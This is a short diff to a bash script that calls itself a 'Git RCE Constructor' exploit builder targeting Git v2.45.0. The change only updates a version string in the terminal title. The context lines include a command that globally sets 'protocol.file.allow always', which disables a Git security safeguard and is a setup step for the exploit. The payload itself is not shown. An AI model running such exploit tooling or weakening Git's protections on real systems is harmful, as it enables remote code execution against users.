@@ -1,7 +1,7 @@
 #!/bin/bash
 set +x
 echo Git RCE Constructor v1.7.2 \(Local Mode\)
-echo -e "\033]0;Git RCE Constructor v1.7 (Local Mode)\007"
+echo -e "\033]0;Git RCE Constructor v1.7.2 (Local Mode)\007"
 echo Notice: You must use Git v2.45.0 for this exploit to work!
 set -x
 git config --global protocol.file.allow always
